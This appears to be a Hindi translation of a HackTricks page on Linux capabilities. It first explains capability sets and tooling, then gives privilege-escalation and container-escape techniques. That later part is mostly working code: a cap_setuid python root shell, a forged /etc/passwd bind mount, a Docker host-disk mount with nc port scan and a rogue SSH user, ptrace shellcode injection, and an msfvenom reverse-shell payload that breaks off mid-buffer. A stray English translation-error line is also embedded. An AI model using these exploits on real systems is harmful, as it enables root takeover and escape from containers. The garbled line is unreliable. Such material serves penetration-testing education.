# Linux क्षमताएँ (Capabilities)

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें.**
* **अपनी हैकिंग तरकीबें साझा करें, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में साइबर सुरक्षा की सबसे प्रासंगिक घटना है और **यूरोप** में सबसे महत्वपूर्ण में से एक है। तकनीकी ज्ञान को बढ़ावा देने के मिशन के साथ, यह कांग्रेस हर अनुशासन में प्रौद्योगिकी और साइबर सुरक्षा पेशेवरों के लिए एक उबलता मिलन बिंदु है।\\

{% embed url="https://www.rootedcon.com/" %}

## क्षमताएँ (Capabilities) क्यों?

Linux क्षमताएँ प्रक्रिया को उपलब्ध root विशेषाधिकारों का एक उपसमूह प्रदान करती हैं। यह प्रभावी रूप से root विशेषाधिकारों को छोटे और विशिष्ट इकाइयों में विभाजित करता है। प्रत्येक इकाई को फिर स्वतंत्र रूप से प्रक्रियाओं को प्रदान किया जा सकता है। इस तरह से विशेषाधिकारों का पूरा सेट कम हो जाता है और शोषण के जोखिम कम हो जाते हैं।

Linux क्षमताओं के काम करने के तरीके को बेहतर समझने के लिए, पहले उस समस्या पर एक नज़र डालते हैं जिसे यह हल करने की कोशिश करता है।

मान लीजिए हम एक सामान्य उपयोगकर्ता के रूप में एक प्रक्रिया चला रहे हैं। इसका मतलब है कि हम गैर-विशेषाधिकार प्राप्त हैं। हम केवल उस डेटा तक पहुँच सकते हैं जो हमारे द्वारा स्वामित्व में है, हमारे समूह द्वारा, या जो सभी उपयोगकर्ताओं द्वारा पहुँच के लिए चिह्नित है। किसी समय, हमारी प्रक्रिया को अपने कर्तव्यों को पूरा करने के लिए थोड़ी अधिक अनुमतियों की आवश्यकता होती है, जैसे कि एक नेटवर्क सॉकेट खोलना। समस्या यह है कि सामान्य उपयोगकर्ता सॉकेट नहीं खोल सकते, क्योंकि इसके लिए root अनुमतियाँ आवश्यक हैं।

## क्षमताएँ सेट (Capabilities Sets)

**विरासत में मिली क्षमताएँ (Inherited capabilities)**

**CapEff**: _प्रभावी_ क्षमता सेट उन सभी क्षमताओं का प्रतिनिधित्व करता है जो प्रक्रिया उस समय उपयोग कर रही है (यह वास्तविक क्षमता सेट है जिसका उपयोग कर्नेल अनुमति जांच के लिए करता है)। फ़ाइल क्षमताओं के लिए प्रभावी सेट वास्तव में एक एकल बिट है जो दर्शाता है कि क्या अनुमत सेट की क्षमताएँ बाइनरी चलाने पर प्रभावी सेट में स्थानांतरित हो जाएंगी। यह उन बाइनरीज़ के लिए फ़ाइल क्षमताओं का उपयोग करना संभव बनाता है जो क्षमता-जागरूक नहीं हैं बिना विशेष सिस्टम कॉल जारी किए।

**CapPrm**: (_अनुमत_) यह उन क्षमताओं का एक सुपरसेट है जिसे थ्रेड या तो थ्रेड अनुमत या थ्रेड विरासती सेट में जोड़ सकता है। थ्रेड क्षमताओं को प्रबंधित करने के लिए capset() सिस्टम कॉल का उपयोग कर सकता है: यह किसी भी सेट से किसी भी क्षमता को छोड़ सकता है, लेकिन केवल उन क्षमताओं को अपने थ्रेड प्रभावी और विरासती सेट में जोड़ सकता है जो इसके थ्रेड अनुमत सेट में हैं। नतीजतन यह अपने थ्रेड अनुमत सेट में किसी भी क्षमता को नहीं जोड़ सकता, जब तक कि इसके थ्रेड प्रभावी सेट में cap_setpcap क्षमता न हो।

**CapInh**: _विरासती_ सेट का उपयोग करके उन सभी क्षमताओं को निर्दिष्ट किया जा सकता है जो एक माता-पिता प्रक्रिया से विरासत में मिलने की अनुमति है। यह एक प्रक्रिया को किसी भी क्षमता प्राप्त करने से रोकता है जिसकी उसे आवश्यकता नहीं है। यह सेट `execve` के पार संरक्षित है और आमतौर पर एक प्रक्रिया द्वारा सेट किया जाता है _प्राप्त करने वाली_ क्षमताएँ बजाय उस प्रक्रिया के जो अपने बच्चों को क्षमताएँ दे रही है।

**CapBnd**: _बाउंडिंग_ सेट के साथ यह संभव है कि एक प्रक्रिया को कभी भी प्राप्त होने वाली क्षमताओं को प्रतिबंधित किया जा सके। केवल वे क्षमताएँ जो बाउंडिंग सेट में मौजूद हैं, विरासती और अनुमत सेट में अनुमति दी जाएगी।

**CapAmb**: _एम्बिएंट_ क्षमता सेट उन सभी गैर-SUID बाइनरीज़ पर लागू होता है जिनके पास फ़ाइल क्षमताएँ नहीं हैं। यह `execve` कहते समय क्षमताओं को संरक्षित करता है। हालांकि, एम्बिएंट सेट में सभी क्षमताएँ संरक्षित नहीं हो सकती हैं क्योंकि वे गिरा दी जाती हैं यदि वे विरासती या अनुमत क्षमता सेट में मौजूद नहीं हैं। यह सेट `execve` कॉल के पार संरक्षित है।

थ्रेड्स और फ़ाइलों में क्षमताओं के बीच के अंतर और क्षमताओं को थ्रेड्स को कैसे पास किया जाता है, इसकी विस्तृत व्याख्या के लिए निम्नलिखित पृष्ठों को पढ़ें:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## प्रक्रियाएँ और बाइनरीज़ की क्षमताएँ (Processes & Binaries Capabilities)

### प्रक्रियाओं की क्षमताएँ (Processes Capabilities)

किसी विशेष प्रक्रिया की क्षमताओं को देखने के लिए, /proc निर्देशिका में **status** फ़ाइल का उपयोग करें। चू
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
यह कमांड अधिकतर सिस्टम्स पर 5 पंक्तियाँ वापस करनी चाहिए।

* CapInh = विरासत में मिली क्षमताएँ
* CapPrm = अनुमत क्षमताएँ
* CapEff = प्रभावी क्षमताएँ
* CapBnd = बाउंडिंग सेट
* CapAmb = एम्बिएंट क्षमताएँ सेट
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
ये हेक्साडेसिमल नंबर समझ में नहीं आते। capsh उपकरण का उपयोग करके हम उन्हें क्षमताओं के नाम में डिकोड कर सकते हैं।
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
अब हम **capabilities** की जांच करते हैं जो `ping` द्वारा इस्तेमाल की जाती हैं:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
हालांकि वह काम करता है, एक और और आसान तरीका है। चल रही प्रक्रिया की क्षमताओं को देखने के लिए, बस **getpcaps** टूल का उपयोग करें उसके प्रक्रिया ID (PID) के साथ। आप प्रक्रिया IDs की एक सूची भी प्रदान कर सकते हैं।
```bash
getpcaps 1234
```
आइए यहाँ `tcpdump` की क्षमताओं की जांच करें जब बाइनरी को नेटवर्क स्निफ करने के लिए पर्याप्त क्षमताएं (`cap_net_admin` और `cap_net_raw`) दी गई हों (_tcpdump प्रक्रिया 9562 में चल रहा है_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
### बाइनरीज क्षमताएँ

बाइनरीज में ऐसी क्षमताएँ हो सकती हैं जिनका उपयोग निष्पादन के समय किया जा सकता है। उदाहरण के लिए, `ping` बाइनरी में `cap_net_raw` क्षमता पाया जाना बहुत आम है:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
आप **क्षमताओं के साथ बाइनरीज को खोज सकते हैं** इसका उपयोग करके:
```bash
getcap -r / 2>/dev/null
```
### क्षमताओं को हटाना capsh के साथ

यदि हम _ping_ के लिए CAP\_NET\_RAW क्षमताओं को हटा दें, तो ping उपयोगिता अब काम नहीं करनी चाहिए।
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
के आउटपुट के अलावा _capsh_ स्वयं, _tcpdump_ कमांड भी एक त्रुटि उत्पन्न करनी चाहिए।

> /bin/bash: /usr/sbin/tcpdump: ऑपरेशन अनुमति नहीं

त्रुटि स्पष्ट रूप से दिखाती है कि ping कमांड को ICMP सॉकेट खोलने की अनुमति नहीं है। अब हमें यकीन है कि यह अपेक्षित रूप से काम कर रहा है।

### क्षमताओं को हटाना

आप एक बाइनरी की क्षमताओं को हटा सकते हैं
```bash
setcap -r </path/to/binary>
```
## यूजर क्षमताएँ (User Capabilities)

स्पष्ट रूप से **यूजर्स को भी क्षमताएँ असाइन की जा सकती हैं**। इसका शायद यह मतलब है कि यूजर द्वारा निष्पादित हर प्रक्रिया यूजर की क्षमताओं का उपयोग कर सकेगी।\
[इस](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [इस ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)और [इस ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)के आधार पर कुछ फाइलों को कॉन्फ़िगर करने की जरूरत होती है ताकि यूजर को निश्चित क्षमताएँ दी जा सकें लेकिन प्रत्येक यूजर को क्षमताएँ असाइन करने वाली फाइल `/etc/security/capability.conf` होगी।\
फाइल उदाहरण:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## पर्यावरण क्षमताएँ

निम्नलिखित प्रोग्राम को कंपाइल करके यह संभव है कि **क्षमताओं के साथ एक पर्यावरण में बैश शेल को स्पॉन किया जा सके**।

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
Since the provided text does not contain any English text to translate, but only a Markdown end code block tag, there is nothing to translate. If you provide the relevant English text, I can then translate it into Hindi for you.
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**संकलित वातावरणीय बाइनरी द्वारा निष्पादित bash के अंदर** यह देखना संभव है कि **नई क्षमताएँ** (एक सामान्य उपयोगकर्ता के पास "वर्तमान" अनुभाग में कोई क्षमता नहीं होगी)।
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
आप **केवल वे capabilities जोड़ सकते हैं जो पहले से ही permitted और inheritable सेट्स में मौजूद हों**.
{% endhint %}

### Capability-aware/Capability-dumb बाइनरीज

**Capability-aware बाइनरीज नई capabilities का उपयोग नहीं करेंगी** जो पर्यावरण द्वारा दी गई हैं, हालांकि **capability-dumb बाइनरीज उनका उपयोग करेंगी** क्योंकि वे उन्हें अस्वीकार नहीं करेंगी। यह capability-dumb बाइनरीज को विशेष पर्यावरण के अंदर असुरक्षित बनाता है जो बाइनरीज को capabilities प्रदान करता है।

## सर्विस Capabilities

डिफ़ॉल्ट रूप से एक **सर्विस जो रूट के रूप में चल रही होती है उसे सभी capabilities सौंपी जाती हैं**, और कभी-कभी यह खतरनाक हो सकता है।\
इसलिए, एक **सर्विस कॉन्फ़िगरेशन** फ़ाइल आपको उन **capabilities को निर्दिष्ट करने की अनुमति देती है** जिन्हें आप चाहते हैं कि सर्विस में हो, **और** वह **यूज़र** जो सर्विस को एक्जीक्यूट करना चाहिए ताकि अनावश्यक विशेषाधिकारों के साथ सर्विस चलाने से बचा जा सके:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Containers में Capabilities

डिफ़ॉल्ट रूप से Docker कंटेनरों को कुछ capabilities प्रदान करता है। इन capabilities को जांचना बहुत आसान है, इसके लिए चलाएं:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में साइबर सुरक्षा की सबसे महत्वपूर्ण घटना है और **यूरोप** में सबसे अधिक महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने के मिशन** के साथ, यह कांग्रेस हर अनुशासन में प्रौद्योगिकी और साइबर सुरक्षा पेशेवरों के लिए एक उबलता मिलन बिंदु है।

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Capabilities तब उपयोगी होती हैं जब आप **विशेषाधिकार प्राप्त कार्यों को करने के बाद अपनी प्रक्रियाओं को प्रतिबंधित करना चाहते हैं** (उदाहरण के लिए, chroot सेटअप करने के बाद और सॉकेट से बाइंडिंग करने के बाद)। हालांकि, उन्हें दुर्भावनापूर्ण कमांड्स या तर्कों को पास करके शोषित किया जा सकता है जो फिर रूट के रूप में चलाए जाते हैं।

आप `setcap` का उपयोग करके प्रोग्राम्स पर Capabilities लागू कर सकते हैं, और इन्हें `getcap` का उपयोग करके पूछताछ कर सकते हैं:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` का अर्थ है आप क्षमता जोड़ रहे हैं ("-" इसे हटा देगा) प्रभावी और अनुमति के रूप में।

क्षमताओं वाले प्रोग्रामों की पहचान करने के लिए सिस्टम या फोल्डर में:
```bash
getcap -r / 2>/dev/null
```
### उदाहरण का शोषण

निम्नलिखित उदाहरण में बाइनरी `/usr/bin/python2.6` privesc के लिए संवेदनशील पाई गई है:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**क्षमताएँ** जो `tcpdump` को **किसी भी उपयोगकर्ता को पैकेट्स स्निफ करने की अनुमति देने के लिए आवश्यक हैं**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "खाली" क्षमताओं का विशेष मामला

ध्यान दें कि किसी प्रोग्राम फ़ाइल को खाली क्षमता सेट असाइन किया जा सकता है, और इस प्रकार यह संभव है कि एक सेट-यूज़र-ID-रूट प्रोग्राम बनाया जा सकता है जो प्रोग्राम को निष्पादित करने वाली प्रक्रिया की प्रभावी और सहेजी गई सेट-यूज़र-ID को 0 पर बदल देता है, लेकिन उस प्रक्रिया को कोई क्षमताएं प्रदान नहीं करता है। या, सरल शब्दों में, यदि आपके पास एक बाइनरी है जो:

1. रूट के स्वामित्व में नहीं है
2. कोई `SUID`/`SGID` बिट्स सेट नहीं है
3. खाली क्षमताएं सेट है (उदाहरण: `getcap myelf` लौटाता है `myelf =ep`)

तो **वह बाइनरी रूट के रूप में चलेगी**।

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) एक व्यापक क्षमता है, यह आसानी से अतिरिक्त क्षमताओं या पूर्ण रूट (आमतौर पर सभी क्षमताओं तक पहुंच) की ओर ले जा सकती है। `CAP_SYS_ADMIN` की आवश्यकता होती है **प्रशासनिक कार्यों** को प्रदर्शन करने के लिए, जिसे कंटेनरों से हटाना मुश्किल है यदि कंटेनर के भीतर विशेषाधिकार प्राप्त कार्य किए जाते हैं। इस क्षमता को बनाए रखना अक्सर उन कंटेनरों के लिए आवश्यक होता है जो पूरे सिस्टम की नकल करते हैं बनाम व्यक्तिगत एप्लिकेशन कंटेनर जो अधिक प्रतिबंधात्मक हो सकते हैं। इसके अलावा यह **डिवाइसेस को माउंट** करने या **release\_agent** का दुरुपयोग करके कंटेनर से बचने की अनुमति देता है।

**बाइनरी के साथ उदाहरण**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
पायथन का उपयोग करके आप एक संशोधित _passwd_ फाइल को असली _passwd_ फाइल के ऊपर माउंट कर सकते हैं:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
और अंत में संशोधित `passwd` फ़ाइल को `/etc/passwd` पर **mount** करें:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
और आप **`su` as root** का उपयोग कर सकेंगे पासवर्ड "password" के साथ।

**उदाहरण पर्यावरण के साथ (Docker breakout)**

आप डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं इसका उपयोग करके:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले आउटपुट में आप देख सकते हैं कि SYS\_ADMIN क्षमता सक्षम है।

* **Mount**

यह डॉकर कंटेनर को **होस्ट डिस्क को माउंट करने और उसे स्वतंत्र रूप से एक्सेस करने की अनुमति देता है**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **पूर्ण पहुंच**

पिछली विधि में हमने docker host डिस्क तक पहुंच बना ली थी।\
यदि आप पाते हैं कि host पर एक **ssh** सर्वर चल रहा है, तो आप **docker host** डिस्क के अंदर एक उपयोगकर्ता बना सकते हैं और SSH के माध्यम से उस तक पहुंच सकते हैं:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**इसका मतलब है कि आप किसी प्रोसेस में शेलकोड इंजेक्ट करके कंटेनर से बाहर निकल सकते हैं जो होस्ट के अंदर चल रहा है।** होस्ट के अंदर चल रहे प्रोसेसेस तक पहुँचने के लिए कंटेनर को कम से कम **`--pid=host`** के साथ चलाया जाना चाहिए।

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `ptrace(2)` का उपयोग करने और हाल ही में पेश किए गए क्रॉस मेमोरी अटैच सिस्टम कॉल्स जैसे `process_vm_readv(2)` और `process_vm_writev(2)` की अनुमति देता है। यदि यह क्षमता प्रदान की गई है और `ptrace(2)` सिस्टम कॉल स्वयं सेकॉम्प फिल्टर द्वारा अवरुद्ध नहीं है, तो यह एक हमलावर को अन्य सेकॉम्प प्रतिबंधों को बायपास करने की अनुमति देगा, देखें [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53) या **निम्नलिखित PoC**:

**बाइनरी के साथ उदाहरण (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**उदाहरण बाइनरी (gdb) के साथ**

`gdb` `ptrace` क्षमता के साथ:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
मेमोरी में इंजेक्ट करने के लिए gdb के माध्यम से msfvenom के साथ एक shellcode बनाएं।
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
